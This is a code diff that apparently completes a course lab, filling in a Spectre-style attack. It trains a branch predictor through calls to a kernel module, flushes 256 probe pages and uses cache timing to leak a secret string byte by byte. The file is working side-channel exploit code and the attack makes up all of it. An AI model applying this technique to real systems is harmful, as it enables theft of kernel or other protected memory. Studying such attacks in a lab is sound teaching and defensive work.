@@ -40,14 +40,44 @@ static inline void call_kernel_part2(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
+    uint64_t threshold = 185; 
+
+
+    //Step 1 : Train the branch predictor 
+
+    for (int i =0; i<200; i++) {
+        call_kernel_part1 (kernel_fd, shared_memory, 1);
+        call_kernel_part1 (kernel_fd, shared_memory, 2);
+        call_kernel_part1 (kernel_fd, shared_memory, 3);
+        call_kernel_part1 (kernel_fd, shared_memory, 4);
+    }
+
 
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < LAB2_SECRET_MAX_LEN; current_offset++) {
         char leaked_byte;
+        uint64_t access_time;
 
-        // [Part 2]- Fill this in!
-        // leaked_byte = ??
+        // Step1 : Flush the shared memory 
+        for (int block = 0; block < 256; block++) {
+
+            clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+            clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+        }
+
+        // step2 : call the victim 
+        for (int i=0; i<7; i++) {
+            call_kernel_part1 (kernel_fd, shared_memory, current_offset);                    
+        }
+
+        // Step3 : read the cache to retrieve the secret byte
+        for (int block = 0; block < 256; block++) {
+            access_time = time_access(shared_memory + (LAB2_PAGE_SIZE * block));
+            if (access_time < threshold) {
+                leaked_byte = (char)block; 
+            }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
